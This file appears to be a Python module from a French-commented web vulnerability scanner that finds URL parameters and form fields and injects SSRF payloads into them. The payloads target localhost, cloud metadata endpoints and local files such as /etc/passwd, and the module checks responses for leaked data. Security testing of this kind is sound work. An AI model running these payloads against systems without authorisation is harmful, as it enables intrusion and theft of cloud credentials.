# Détection des SSRF (Server-Side Request Forgery)

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from pprint import pprint
from core.config import create_session, DEFAULT_TIMEOUT

# Liste des paramètres suspects liés aux URL (potentiellement vulnérables à SSRF)
SSRF_KEYS = [
    "url", "redirect", "next", "dest", "destination", "link", "site", "path",
    "fetch", "load", "proxy", "image", "img", "file", "callback", "to", "forward",
    "uri", "href", "src", "source", "ref", "return", "return_url", "goto",
    "checkout_url", "continue", "return_to", "redirect_uri", "redirect_url",
]

# Cibles pour tester SSRF
SSRF_TEST_URLS = [
    "http://localhost:80",
    "http://127.0.0.1:80",
    "http://[::1]:80",
    "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
    "http://169.254.169.254",
    "http://metadata.google.internal/computeMetadata/v1/",  # Google Cloud Metadata
    "http://100.100.100.200/latest/meta-data/",  # Azure/Alibaba Metadata
    "http://0.0.0.0:80",
    "http://internal.server.local",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "http://127.1:80",
    "http://0x7f000001:80",  # Hex encoded 127.0.0.1
    "http://2130706433:80",  # Decimal encoded 127.0.0.1
]

SSRF_SIGNATURES = [
    "root:x:0:0",
    "EC2Metadata",
    "127.0.0.1",
    "ComputeMetadata",
    "100.100.100.200",
    "ami-id",
    "instance-id",
    "[extensions]",
    "for 16-bit app support",
]


def find_ssrf_in_urls(target, session=None, timeout=DEFAULT_TIMEOUT):
    """Analyse les liens pour détecter les paramètres SSRF potentiels."""
    print(f"[~] Recherche de paramètres SSRF dans {target}...")
    if not session:
        session = create_session()
    try:
        response = session.get(target, timeout=timeout)
        soup = BeautifulSoup(response.text, 'html.parser')

        detected_params = []
        for link in soup.find_all('a', href=True):
            url = link['href']
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = parsed_url.query.split("&")
                for param in params:
                    name = param.split("=")[0]
                    if name.lower() in [k.lower() for k in SSRF_KEYS]:
                        detected_params.append({"url": urljoin(target, url), "param": name})
                        print(f"[!!!] SSRF potentiel détecté dans {urljoin(target, url)}")
        return detected_params
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la requête : {e}")
        return []


def find_ssrf_in_forms(target, session=None, timeout=DEFAULT_TIMEOUT):
    """Recherche les formulaires contenant des champs susceptibles d'être vulnérables à SSRF."""
    print(f"[~] Recherche de formulaires SSRF dans {target}...")
    if not session:
        session = create_session()
    try:
        response = session.get(target, timeout=timeout)
        soup = BeautifulSoup(response.text, 'html.parser')

        detected_forms = []
        for form in soup.find_all('form'):
            action = form.attrs.get("action", "").strip()
            method = form.attrs.get("method", "get").lower()
            inputs = {input_tag.attrs.get("name"): input_tag.attrs.get("value", "")
                      for input_tag in form.find_all("input") if input_tag.attrs.get("name")}
            if any(param.lower() in [k.lower() for k in SSRF_KEYS] for param in inputs):
                detected_forms.append({
                    "action": urljoin(target, action) if action else target,
                    "method": method,
                    "inputs": inputs
                })
                print(f"[!!!] SSRF potentiel détecté dans {urljoin(target, action)}")
        return detected_forms
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la requête : {e}")
        return []


def test_ssrf(target_url, param, method="get", session=None, timeout=DEFAULT_TIMEOUT):
    """Injecte des URLs malveillantes pour tester SSRF."""
    print(f"[~] Test SSRF sur {target_url}...")
    if not session:
        session = create_session()
    for test_url in SSRF_TEST_URLS:
        test_payload = f"{target_url}&{param}={test_url}" if "?" in target_url else f"{target_url}?{param}={test_url}"
        try:
            if method == "get":
                response = session.get(test_payload, timeout=timeout, allow_redirects=False)
            else:
                response = session.post(target_url, data={param: test_url}, timeout=timeout, allow_redirects=False)

            if any(sig in response.text for sig in SSRF_SIGNATURES):
                print(f"[!!!] SSRF détectée sur {test_payload}!")
                return {"url": test_payload, "ssrf_exploitable": True}
            if response.status_code in (301, 302, 307, 308):
                location = response.headers.get("Location", "")
                if any(test in location for test in ["127.0.0.1", "localhost", "169.254", "metadata"]):
                    print(f"[!!!] Redirection suspecte détectée sur {test_payload} -> {location}")
                    return {"url": test_payload, "ssrf_exploitable": "Suspicious redirect", "location": location}
        except requests.exceptions.RequestException:
            pass
    return None


def scan_ssrf(target, formated_target, session=None, timeout=DEFAULT_TIMEOUT):
    """Exécute un scan SSRF sur l'URL cible."""
    print(f"\n\t==============Scan SSRF sur -->{formated_target}<-- 🔍 ==============\n")
    if not session:
        session = create_session()
    results = {"urls": [], "forms": []}

    # 1. Recherche de paramètres SSRF dans les URLs
    urls_with_ssrf = find_ssrf_in_urls(target, session, timeout)
    if urls_with_ssrf:
        print("[~] Test SSRF sur les URLs...")
        for item in urls_with_ssrf:
            result = test_ssrf(item["url"], item["param"], "get", session, timeout)
            if result:
                results["urls"].append(result)

    # 2. Recherche de champs SSRF dans les formulaires
    forms_with_ssrf = find_ssrf_in_forms(target, session, timeout)
    if forms_with_ssrf:
        print("[~] Test SSRF sur les formulaires...")
        for form in forms_with_ssrf:
            action = form["action"]
            method = form["method"]
            for input_name in form["inputs"]:
                result = test_ssrf(action, input_name, method, session, timeout)
                if result:
                    results["forms"].append(result)

    if results["urls"]:
        print("[+] Résultats des tests SSRF sur les URLs :")
        for result in results["urls"]:
            print(f"  - URL: {result['url']}, Exploitable: {result['ssrf_exploitable']}")
    else:
        print("[-] Aucun paramètre SSRF détecté dans les URLs.")

    if results["forms"]:
        print("[+] Résultats des tests SSRF sur les formulaires :")
        for result in results["forms"]:
            print(f"  - Form Action: {result['url']}, Exploitable: {result['ssrf_exploitable']}")
    else:
        print("[-] Aucun champ SSRF détecté dans les formulaires.")

    pprint(results)
    print("\n✅ Scan SSRF terminé.\n")

    return results
